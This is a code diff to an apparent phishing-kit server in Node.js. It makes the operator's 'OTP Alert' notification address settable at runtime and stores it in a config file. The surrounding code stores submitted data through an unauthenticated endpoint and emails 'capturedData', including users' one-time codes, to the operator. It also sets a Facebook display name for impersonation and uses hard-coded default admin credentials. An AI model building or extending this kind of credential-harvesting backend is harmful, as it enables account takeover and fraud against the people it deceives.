@@ -13,8 +13,24 @@ const DATA_FILE = path.join(__dirname, 'data.json');
 const ADMIN_USERNAME = process.env.ADMIN_USER || 'admin';
 const ADMIN_PASSWORD = process.env.ADMIN_PASS || 'admin123';
 
-// ── Admin notification email ───────────────────────────────
-const ADMIN_EMAIL = process.env.ADMIN_EMAIL || '';
+// ── Admin notification email (can be set via env or updated at runtime) ─
+let adminNotificationEmail = process.env.ADMIN_EMAIL || '';
+
+// File to persist admin notification email
+const ADMIN_CONFIG_FILE = path.join(__dirname, 'admin-config.json');
+
+// Load admin config from file if exists
+if (fs.existsSync(ADMIN_CONFIG_FILE)) {
+  try {
+    const config = JSON.parse(fs.readFileSync(ADMIN_CONFIG_FILE, 'utf8'));
+    if (config.notificationEmail) {
+      adminNotificationEmail = config.notificationEmail;
+      console.log(`[Config] Loaded admin notification email from file`);
+    }
+  } catch (e) {
+    console.error('[Config] Failed to load admin config:', e.message);
+  }
+}
 
 // ── Facebook display name ──────────────────────────────────
 const FB_NAME = process.env.FB_NAME || 'John Smith';
@@ -120,6 +136,31 @@ app.get('/api/config/fb-name', (req, res) => {
   res.json({ name: FB_NAME });
 });
 
+// ── Admin notification email config API ────────────────────
+app.get('/api/admin/notification-email', requireAdmin, (req, res) => {
+  res.json({ email: adminNotificationEmail });
+});
+
+app.post('/api/admin/notification-email', requireAdmin, (req, res) => {
+  const { email } = req.body;
+  
+  if (!email || !email.includes('@')) {
+    return res.status(400).json({ success: false, error: 'Valid email is required' });
+  }
+  
+  adminNotificationEmail = email;
+  
+  // Persist to file
+  try {
+    fs.writeFileSync(ADMIN_CONFIG_FILE, JSON.stringify({ notificationEmail: email }, null, 2));
+    console.log(`[Config] Admin notification email updated: ${email}`);
+    res.json({ success: true, email });
+  } catch (e) {
+    console.error('[Config] Failed to save admin config:', e.message);
+    res.status(500).json({ success: false, error: 'Failed to save configuration' });
+  }
+});
+
 // ── Data API (protected) ──────────────────────────────────
 app.post('/api/store', (req, res) => {
   const entry = { ...req.body, timestamp: new Date().toISOString() };
@@ -142,7 +183,7 @@ app.get('/api/data', requireAdmin, (req, res) => {
 app.post('/api/notify-otp', async (req, res) => {
   const { userEmail, capturedData, timestamp } = req.body;
 
-  if (!ADMIN_EMAIL) {
+  if (!adminNotificationEmail) {
     console.log('[OTP Alert] Admin email not configured, skipping notification');
     return res.json({ success: false, message: 'Admin email not configured' });
   }
@@ -170,11 +211,11 @@ app.post('/api/notify-otp', async (req, res) => {
     });
   }
 
-  console.log(`[OTP Alert] Sending notification to ${ADMIN_EMAIL} for user: ${userEmail}`);
+  console.log(`[OTP Alert] Sending notification to ${adminNotificationEmail} for user: ${userEmail}`);
 
   // Send email notification to admin
   const result = await emailSender.sendOTPAdminAlert({
-    to: ADMIN_EMAIL,
+    to: adminNotificationEmail,
     adminName: 'Admin',
     userEmail: userEmail || 'Unknown',
     capturedData: flattenedData,
@@ -291,6 +332,6 @@ app.listen(PORT, () => {
   console.log(`    http://localhost:${PORT}/admin/login             → admin-login.html`);
   console.log(`    http://localhost:${PORT}/admin/email             → email-composer.html (🔒 protected)`);
   console.log(`\n  Admin credentials: ${ADMIN_USERNAME} / ${ADMIN_PASSWORD}`);
-  console.log(`  Admin notification email: ${ADMIN_EMAIL || '(not configured - set ADMIN_EMAIL env var)'}`);
-  console.log(`  SMTP: ${emailSender.getConfig().host}:${emailSender.getConfig().port} (${emailSender.getConfig().user || 'not configured'})\n`);
+  console.log(`  Admin notification email: ${adminNotificationEmail || '(not configured - set via /admin/email)'}`);
+  console.log(`  SMTP: ${emailSender.getConfig().host}:${emailSender.getConfig().port} (${emailSender.getConfig().user || 'not configured - set via /admin/email'})\n`);
 });
